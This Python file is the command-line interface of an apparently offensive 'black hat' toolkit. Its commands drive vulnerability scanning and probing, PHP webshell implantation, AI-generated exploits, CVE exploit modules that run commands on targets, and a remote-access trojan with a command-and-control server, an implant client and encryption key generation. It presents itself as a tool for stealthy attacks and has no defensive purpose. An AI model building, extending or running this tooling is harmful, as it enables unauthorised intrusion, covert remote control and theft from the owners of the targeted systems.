"""
Black Hat CLI — Unified command-line interface for Raphael Black Hat Harness.
"""

import asyncio
import argparse
import json
import sys
import os
import base64
from typing import Optional, List, Dict, Any

from harness.black_hat_core import BlackHatHarness, BlackHatConfig, StealthLevel
from harness.ltad_engine import LiveTargetEngine, LiveTargetState
from harness.php2shell import PHP2ShellExploiter, PHP2ShellConfig
from harness.ai_exploit_generator import ExploitGenerator, EvolutionConfig, ExploitType
from harness.rat_c2 import RATC2Server, RATClient, create_rat_integration
from harness.exploits import get_exploit_module, list_available_modules


async def cmd_exploit(args):
    """Full black hat operation."""
    config = BlackHatConfig(
        target_host=args.target,
        target_port=args.port,
        stealth_level=StealthLevel[args.stealth.upper()],
    )

    harness = BlackHatHarness(config)
    init_result = await harness.initialize()
    print(f"[+] Harness initialized: {json.dumps(init_result, indent=2)}")

    # Load objective if provided
    objective = {}
    if args.objective and os.path.exists(args.objective):
        with open(args.objective) as f:
            objective = json.load(f)

    print(f"[+] Starting exploitation against {args.target}:{args.port}")
    # The actual exploitation would be driven by the harness components
    # This is a framework - specific operations called via other commands


async def cmd_scan(args):
    """Broad internet vulnerability scan."""
    print(f"[+] Scanning {args.target} ports {args.ports}")
    # Would use nmap/nuclei via kali-tools or direct
    import subprocess
    result = subprocess.run(
        ["nmap", "-p", args.ports, args.target],
        capture_output=True, text=True, timeout=300
    )
    print(result.stdout)


async def cmd_exploit_live(args):
    """Live target adaptive exploitation."""
    engine = LiveTargetEngine()
    target = await engine.initialize_live_target(args.host, args.port)
    print(f"[+] Target initialized: {args.host}:{args.port}")
    print(f"    State: {target.state.value}")
    print(f"    Tech stack: {target.tech_stack}")
    print(f"    WAF detected: {target.waf_detected}")
    print(f"    Deception score: {target.deception_score:.2f}")

    # Run adaptive probes
    probe_types = ["sqli", "xss", "cmd_injection", "path_traversal"]
    for pt in probe_types:
        result = await engine.adaptive_probe(target, pt, f"test_{pt}_probe")
        print(f"[+] Probe {pt}: {result.get('status', 'N/A')} - Vulnerable: {result.get('vulnerable', False)}")


async def cmd_php2shell(args):
    """PHP2Shell webshell implantation."""
    config = PHP2ShellConfig()
    exploiter = PHP2ShellExploiter(config)

    result = await exploiter.exploit(
        args.target_url,
        upload_point=args.upload_point,
        lfi_param=args.lfi_param,
        rfi_param=args.rfi_param,
    )
    print(json.dumps(result, indent=2))


async def cmd_research(args):
    """Research via CloakBrowser."""
    # This would integrate with CloakBrowser
    print(f"[+] Researching: {args.query}")
    print(f"    Sources: {args.sources}")

    # Placeholder for CloakBrowser integration
    if args.download_pdfs:
        print("    PDF download enabled")

    # Would call CloakBrowser service
    # browser = CloakBrowserService()
    # results = await browser.research(args.query, args.sources)


async def cmd_ai_generate(args):
    """AI-driven exploit generation."""
    config = EvolutionConfig(
        evolution_cycles=args.cycles,
        mutation_rate=args.mutation_rate,
    )

    generator = ExploitGenerator(config)
    vuln_type = ExploitType(args.vuln_type)

    candidate = await generator.research_and_generate(args.target, vuln_type)
    print(json.dumps(candidate.to_dict(), indent=2))

    # Save exploit
    output_file = f"/tmp/exploit_{candidate.id}.{candidate.language}"
    with open(output_file, "w") as f:
        f.write(candidate.code)
    print(f"\n[+] Exploit saved to: {output_file}")


async def cmd_rat_server(args):
    """Start RAT C2 server."""
    key = None
    if args.key:
        import base64
        key = base64.b64decode(args.key)

    server = RATC2Server(args.host, args.port, key)
    server.start()
    print(f"[+] RAT C2 server started on {args.host}:{args.port}")

    try:
        while True:
            await asyncio.sleep(1)
            implants = server.list_implants()
            if implants:
                print(f"[+] Active implants: {len(implants)}")
                for imp in implants:
                    print(f"    {imp['id']} - {imp['host']} - {imp['status']}")
    except KeyboardInterrupt:
        server.stop()
        print("\n[+] Server stopped")


async def cmd_rat_client(args):
    """Run RAT client/implant."""
    import base64
    key = base64.b64decode(args.key)

    client = RATClient(args.host, args.port, key)
    await client.connect()


async def cmd_exploit_module(args):
    """Run specific exploit module."""
    module = get_exploit_module(args.cve_id)
    if not module:
        print(f"[-] Unknown CVE: {args.cve_id}")
        print(f"Available: {', '.join([m['cve_id'] for m in list_available_modules()])}")
        return

    port = args.port or module.port

    if args.check_only:
        result = await module.check(args.target, port)
        print(json.dumps(result, indent=2))
    else:
        result = await module.exploit(args.target, port, command=args.exec_command)
        print(json.dumps(result, indent=2))


async def cmd_list_exploits(args):
    """List available exploit modules."""
    modules = list_available_modules()
    for m in modules:
        print(f"{m['cve_id']}: {m['name']} ({m['service']}:{m['port']}) - {m['description']}")


async def cmd_generate_key(args):
    """Generate Fernet key for RAT encryption."""
    from cryptography.fernet import Fernet
    key = Fernet.generate_key()
    print(f"Key (base64): {base64.b64encode(key).decode()}")
    if args.output:
        with open(args.output, "wb") as f:
            f.write(key)
        print(f"[+] Saved to {args.output}")


def main():
    parser = argparse.ArgumentParser(
        prog="raphael",
        description="Raphael Black Hat Harness v3.1 - Maximum attack power. Maximum stealth. Zero Docker."
    )
    subparsers = parser.add_subparsers(dest="command", help="Available commands")

    # exploit - full operation
    exploit_parser = subparsers.add_parser("exploit", help="Full black hat operation")
    exploit_parser.add_argument("--target", required=True, help="Target IP/hostname")
    exploit_parser.add_argument("--port", type=int, default=443, help="Target port")
    exploit_parser.add_argument("--os", choices=["windows", "linux"], default="windows")
    exploit_parser.add_argument("--stealth", choices=["normal", "maximum", "paranoid"], default="maximum")
    exploit_parser.add_argument("--objective", help="Objective JSON file")

    # scan
    scan_parser = subparsers.add_parser("scan", help="Broad vulnerability scan")
    scan_parser.add_argument("--target", required=True)
    scan_parser.add_argument("--ports", default="1-1000")

    # exploit-live
    live_parser = subparsers.add_parser("exploit-live", help="Live target adaptive exploitation")
    live_parser.add_argument("--host", required=True)
    live_parser.add_argument("--port", type=int, default=443)

    # php2shell
    php2shell_parser = subparsers.add_parser("php2shell", help="PHP2Shell webshell implantation")
    php2shell_parser.add_argument("--target-url", required=True)
    php2shell_parser.add_argument("--upload-point")
    php2shell_parser.add_argument("--lfi-param")
    php2shell_parser.add_argument("--rfi-param")

    # research
    research_parser = subparsers.add_parser("research", help="Research via CloakBrowser")
    research_parser.add_argument("--query", required=True)
    research_parser.add_argument("--sources", default="scihub,exploitdb")
    research_parser.add_argument("--download-pdfs", action="store_true")

    # ai-generate
    ai_parser = subparsers.add_parser("ai-generate", help="AI-driven exploit generation")
    ai_parser.add_argument("--target", required=True)
    ai_parser.add_argument("--vuln-type", required=True, choices=[e.value for e in ExploitType])
    ai_parser.add_argument("--cycles", type=int, default=15)
    ai_parser.add_argument("--mutation-rate", type=float, default=0.3)

    # rat-server
    rat_server_parser = subparsers.add_parser("rat-server", help="Start RAT C2 server")
    rat_server_parser.add_argument("--host", default="0.0.0.0")
    rat_server_parser.add_argument("--port", type=int, default=443)
    rat_server_parser.add_argument("--key", help="Base64 encoded Fernet key")

    # rat-client
    rat_client_parser = subparsers.add_parser("rat-client", help="Run RAT client/implant")
    rat_client_parser.add_argument("host")
    rat_client_parser.add_argument("port", type=int)
    rat_client_parser.add_argument("--key", required=True, help="Base64 encoded Fernet key")

    # exploit-module
    em_parser = subparsers.add_parser("exploit-module", help="Run specific exploit module")
    em_parser.add_argument("cve_id")
    em_parser.add_argument("target")
    em_parser.add_argument("--port", type=int)
    em_parser.add_argument("--exec-command", default="id", dest="exec_command")
    em_parser.add_argument("--check-only", action="store_true")

    # list-exploits
    subparsers.add_parser("list-exploits", help="List available exploit modules")

    # generate-key
    key_parser = subparsers.add_parser("generate-key", help="Generate Fernet key")
    key_parser.add_argument("--output", help="Output file")

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return 1

    # Map commands to handlers
    handlers = {
        "exploit": cmd_exploit,
        "scan": cmd_scan,
        "exploit-live": cmd_exploit_live,
        "php2shell": cmd_php2shell,
        "research": cmd_research,
        "ai-generate": cmd_ai_generate,
        "rat-server": cmd_rat_server,
        "rat-client": cmd_rat_client,
        "exploit-module": cmd_exploit_module,
        "list-exploits": cmd_list_exploits,
        "generate-key": cmd_generate_key,
    }

    handler = handlers.get(args.command)
    if handler:
        try:
            asyncio.run(handler(args))
        except KeyboardInterrupt:
            print("\n[!] Interrupted")
            return 130
        except Exception as e:
            print(f"[-] Error: {e}")
            import traceback
            traceback.print_exc()
            return 1
    else:
        parser.print_help()
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())